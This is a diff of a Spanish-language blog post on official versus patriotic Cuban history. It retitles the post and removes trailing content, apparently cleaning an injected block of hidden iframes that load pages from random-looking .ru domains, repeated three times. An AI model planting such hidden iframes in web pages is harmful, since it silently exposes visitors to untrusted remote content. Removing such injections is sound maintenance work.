@@ -1,5 +1,5 @@
 ---
-title: "historia de cuba La Trinchera Por Mario Valdés Navia"
+title: "La historia oficial y la historia patria"
 date: "2018-07-16T17:29:59+00:00"
 author: "Mario Valdés Navia"
 category: "Historia"
@@ -22,23 +22,3 @@ A todo esto se debe añadir la cuota de responsabilidad y el probable margen de 
 **La Historia como ciencia es una sola, sea positivista, marxista, analista, cualitativa; oficial o no; cubana o extranjera; lo que la hace válida científicamente es su concordancia con la realidad de una época, del pensamiento y la acción de los hombres y mujeres que la hicieron y su eficaz plasmación en los textos de los que la escriben.**
 
 Tomado de: La Joven Cuba
-
-[Otro texto del autor](/marxismo-en-cuba/)
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-## Autor
-
--   ![](/avatar/e5d4ac9a023b2fcc57340a4d5963fd53?s=80&r=g&d=mm)
-    
-    ![](//www.gravatar.com/avatar/e5d4ac9a023b2fcc57340a4d5963fd53?s=80&r=g&d=mm)
-    
-    [Miguel Alejandro Hayes](https://web.archive.org/web/20221204123508/https://www.desdetutrinchera.com/author/miguel-hayes/)
-    
-    Editor principal de La Trinchera. Escribo por inspiración
-    
-    [](mailto:hayesmartinez.mrgh@gmail.com)
